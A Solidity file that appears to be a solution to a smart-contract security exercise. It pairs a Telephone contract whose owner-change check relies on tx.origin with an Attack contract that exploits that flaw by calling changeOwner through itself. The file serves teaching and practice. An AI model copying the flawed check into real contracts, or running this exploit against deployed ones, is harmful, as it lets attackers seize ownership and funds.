// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    address public telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function attack() public {
        Telephone telephone = Telephone(telephoneAddress);
        telephone.changeOwner(msg.sender);
    }
}
